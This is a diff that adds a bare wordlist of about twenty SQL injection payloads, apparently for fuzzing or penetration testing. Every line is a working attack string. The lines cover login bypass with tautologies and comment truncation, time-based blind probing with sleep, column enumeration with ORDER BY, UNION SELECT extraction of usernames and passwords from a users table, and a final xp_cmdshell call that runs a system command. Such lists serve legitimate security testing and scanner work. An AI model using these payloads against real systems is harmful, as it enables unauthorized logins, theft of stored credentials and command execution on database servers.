@@ -1,0 +1,20 @@
+' OR '1'='1
+" OR "1"="1
+') OR ('1'='1
+1' OR '1' = '1' --
+1' OR 1=1 --
+' OR 1=1#
+' OR 1=1/*
+admin' --
+' OR '' = '
+' OR 1=1 LIMIT 1 --
+1 OR 1=1
+') OR '1'='1' --
+") OR ("1"="1" --
+' OR sleep(5)--
+' AND 1=0 UNION SELECT NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username, password FROM users--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1'; EXEC xp_cmdshell('whoami')--
